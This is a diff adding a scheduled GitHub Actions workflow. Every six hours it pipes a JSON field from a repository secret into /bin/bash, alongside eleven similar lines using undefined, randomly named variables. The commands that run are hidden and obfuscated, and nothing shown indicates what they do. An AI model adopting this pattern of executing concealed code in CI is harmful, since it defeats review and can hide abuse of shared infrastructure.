@@ -1,0 +1,28 @@
+name: yuecaifengfen
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuecaifengfen
+        env:
+          n5: ${{ secrets.n5 }}
+        run: |
+          echo $n5 | jq -r .zt18348 | /bin/bash
+          echo $meyf59065 | jq -r .fvkc4814 | /bin/bash
+          echo $z1 | jq -r .gdv201 | /bin/bash
+          echo $tz1706 | jq -r .urkbt8 | /bin/bash
+          echo $xrw2 | jq -r .dbv88960 | /bin/bash
+          echo $ofsa13 | jq -r .oqznm1869 | /bin/bash
+          echo $ope97151 | jq -r .y0038 | /bin/bash
+          echo $fcutz377 | jq -r .cbyqb420 | /bin/bash
+          echo $ul9572 | jq -r .aof81 | /bin/bash
+          echo $fbbs1726 | jq -r .gpqup73 | /bin/bash
+          echo $bnqee683 | jq -r .dg8 | /bin/bash
+          echo $xv4611 | jq -r .be016 | /bin/bash
+
